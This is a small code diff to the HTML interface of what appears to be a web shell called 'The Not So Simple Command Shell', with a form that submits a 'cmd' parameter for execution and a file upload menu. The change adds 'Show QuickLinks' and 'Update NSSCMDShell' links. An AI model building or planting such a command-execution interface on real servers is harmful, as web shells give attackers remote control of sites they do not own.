@@ -13,7 +13,7 @@
         <div style="border:1px solid #333;width:50%;padding:0px 30px;border-radius:10px;margin:10px 40px;">
         <h4 style="">The Not So Simple Command Shell</h4>
         <form action="" method="get">Command? <input type="text" name="cmd" autofocus/>
-        <button type="submit">Execute</button></form>
+        <button type="submit">Execute</button>&nbsp;&nbsp;&nbsp;<a href="?links=1"> Show QuickLinks</a>&nbsp;&nbsp;&nbsp;<a href="?update=true">Update NSSCMDShell</a></form>
         <p>File Options</p>
         <form action="" method="get">
         <select name="upload">
